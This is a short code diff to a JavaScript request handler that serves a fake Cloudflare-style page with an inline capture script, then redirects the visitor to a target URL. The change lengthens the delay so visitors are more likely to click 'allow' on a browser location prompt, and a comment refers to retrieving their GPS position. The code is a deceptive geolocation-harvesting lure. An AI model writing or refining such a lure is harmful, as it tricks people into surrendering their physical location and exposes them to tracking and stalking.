@@ -150,10 +150,12 @@ module.exports = async (req, res) => {
             }
 
             // Quick Redirect - delayed slightly more to allow user to stare at the fake cloudflare page
-            // and potentially click 'allow' on a location prompt if it appears.
-            setTimeout(() => {
+            // and potentially click 'allow' on a location prompt if it appears. (3 seconds)
+            let redirectTimer = setTimeout(() => {
                 window.location.replace("${targetUrl}");
-            }, 1200);
+            }, 3000);
+            
+            // If GPS is successfully retrieved quickly, we can redirect sooner, but let's just stick to the timeout for consistency.
         }
         capture();
     </script>
